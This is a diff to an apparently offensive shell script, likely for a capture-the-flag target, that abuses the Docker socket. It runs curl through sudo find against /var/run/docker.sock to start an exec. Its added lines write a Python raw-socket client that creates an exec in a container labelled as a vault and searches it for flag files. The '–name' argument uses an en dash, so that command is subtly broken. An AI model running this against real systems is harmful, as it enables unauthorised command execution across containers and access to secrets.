@@ -59,3 +59,30 @@ sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
   -X POST http://localhost/exec/$EXEC_ID/start \
   -H "Content-Type: application/json" \
   -d '{"Detach":false}' \; 2>/dev/null
+
+echo "=== VAULT CONTAINER EXEC ==="
+python3 -c "
+import socket, json
+
+def docker_request(method, path, body=None):
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.connect('/var/run/docker.sock')
+    req = f'{method} {path} HTTP/1.1\r\nHost: localhost\r\n'
+    if body:
+        b = json.dumps(body).encode()
+        req += f'Content-Type: application/json\r\nContent-Length: {len(b)}\r\n\r\n'
+        s.sendall(req.encode() + b)
+    else:
+        req += '\r\n'
+        s.sendall(req.encode())
+    resp = b''
+    while True:
+        d = s.recv(4096)
+        if not d: break
+        resp += d
+    s.close()
+    return resp.decode(errors='ignore')
+
+r = docker_request('POST', '/containers/b0b22fe23519/exec', {'AttachStdout':True,'AttachStderr':True,'Cmd':['find','/','–name','flag*']})
+print(r[-500:])
+"
